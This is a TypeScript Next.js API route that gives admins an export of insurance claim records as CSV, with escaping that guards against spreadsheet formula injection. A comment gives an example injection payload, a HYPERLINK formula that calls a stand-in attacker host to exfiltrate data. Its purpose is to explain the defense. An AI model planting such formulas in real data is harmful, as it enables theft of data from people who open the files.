import { NextRequest, NextResponse } from 'next/server'
import { createServiceClient } from '@/lib/supabase/service'
import { requireAdmin } from '@/lib/auth/require-admin'
import { scopedClient } from '@/lib/supabase/scoped'

export const runtime = 'nodejs'

interface ClaimRow {
  id: string
  ma_number: string | null
  vehicle: string | null
  vin: string | null
  date: string | null
  acv: number | null
  status: string | null
  assigned_to: string | null
  submitted_at: string | null
  submitted_by: string | null
  claim: {
    claimNumber?: string
    insuredName?: string
    insuranceCompany?: string
    ownerName?: string
    location?: string
  } | null
}

interface ProfileRow {
  id: string
  name: string | null
  email: string
}

// Wraps a value in CSV-safe form: escapes double-quotes, wraps in quotes
// when the value contains a comma/newline/quote, AND prefixes a single quote
// on any value that starts with =, +, -, @, tab, or CR — Excel/Sheets
// interprets those as formulas otherwise, so an attacker who slipped
// `=HYPERLINK("http://evil/",A1)` into an insured name via import could
// exfiltrate data (or worse) when an admin opens the export.
function csvEscape(v: unknown): string {
  if (v === null || v === undefined) return ''
  let s = String(v)
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s
  if (/[",\r\n]/.test(s)) return '"' + s.replace(/"/g, '""') + '"'
  return s
}

// Normalize a date string (ISO or epoch-like) to YYYY-MM-DD for spreadsheet
// friendliness. Falls back to raw string if we can't parse it.
function fmtDate(v: string | null | undefined): string {
  if (!v) return ''
  const d = new Date(v)
  if (isNaN(d.getTime())) return v
  const y = d.getFullYear()
  const m = String(d.getMonth() + 1).padStart(2, '0')
  const day = String(d.getDate()).padStart(2, '0')
  return `${y}-${m}-${day}`
}

// GET /api/admin/export/claims?status=all|open|closed&from=YYYY-MM-DD&to=YYYY-MM-DD
// Returns a CSV file download. Admin-only.
export async function GET(request: NextRequest) {
  const { caller, errorResponse } = await requireAdmin()
  if (errorResponse) return errorResponse

  const url = new URL(request.url)
  const statusParam = (url.searchParams.get('status') ?? 'all').toLowerCase()
  const from = url.searchParams.get('from') // YYYY-MM-DD
  const to = url.searchParams.get('to')     // YYYY-MM-DD

  // Scope to the admin's active company. Falls back to raw service client
  // when activeCompanyId is null (pre-migration).
  const rawService = createServiceClient()
  const service = caller!.activeCompanyId
    ? scopedClient(rawService, caller!.activeCompanyId)
    : rawService

  let query = service
    .from('acv_history')
    .select('id, ma_number, vehicle, vin, date, acv, status, assigned_to, submitted_at, submitted_by, claim')
    .order('date', { ascending: false })

  if (statusParam === 'open') query = query.eq('status', 'open')
  else if (statusParam === 'closed') query = query.eq('status', 'closed')

  // The `date` column is text (ISO string), so lexicographic gte/lte works
  // as long as callers pass YYYY-MM-DD (which our UI does).
  if (from) query = query.gte('date', from)
  if (to)   query = query.lte('date', to + 'T23:59:59.999Z')

  const { data: rows, error } = await query
  if (error) return NextResponse.json({ error: error.message }, { status: 500 })
  const claims = (rows as ClaimRow[]) ?? []

  // Resolve profile names for assigned_to + submitted_by in one round-trip.
  const userIds = Array.from(
    new Set(claims.flatMap(c => [c.assigned_to, c.submitted_by].filter((v): v is string => !!v))),
  )
  const profMap = new Map<string, string>()
  if (userIds.length > 0) {
    const { data: profs } = await service
      .from('profiles')
      .select('id, name, email')
      .in('id', userIds)
    for (const p of (profs as ProfileRow[]) ?? []) {
      profMap.set(p.id, p.name || p.email || 'Unknown')
    }
  }

  const headers = [
    'MA #',
    'Claim #',
    'Insured',
    'Owner',
    'Vehicle',
    'VIN',
    'Date',
    'Insurance Co.',
    'Location',
    'Assigned To',
    'Status',
    'Submitted At',
    'Submitted By',
    'ACV Amount',
  ]

  const lines: string[] = [headers.map(csvEscape).join(',')]
  for (const c of claims) {
    lines.push([
      c.ma_number ?? '',
      c.claim?.claimNumber ?? '',
      c.claim?.insuredName ?? '',
      c.claim?.ownerName ?? '',
      c.vehicle ?? '',
      c.vin ?? '',
      fmtDate(c.date),
      c.claim?.insuranceCompany ?? '',
      c.claim?.location ?? '',
      c.assigned_to ? (profMap.get(c.assigned_to) ?? '') : '',
      c.status === 'closed' ? 'Closed' : 'Open',
      fmtDate(c.submitted_at),
      c.submitted_by ? (profMap.get(c.submitted_by) ?? '') : '',
      c.acv != null ? c.acv : '',
    ].map(csvEscape).join(','))
  }

  const stamp = new Date().toISOString().slice(0, 10).replace(/-/g, '')
  const filename = `modern-tools-claims-${stamp}.csv`

  // \r\n line terminators for maximum Excel/Windows compatibility.
  // Leading BOM so Excel opens UTF-8 columns without mojibake.
  const body = '﻿' + lines.join('\r\n') + '\r\n'

  return new NextResponse(body, {
    status: 200,
    headers: {
      'Content-Type': 'text/csv; charset=utf-8',
      'Content-Disposition': `attachment; filename="${filename}"`,
      'Cache-Control': 'no-store',
    },
  })
}
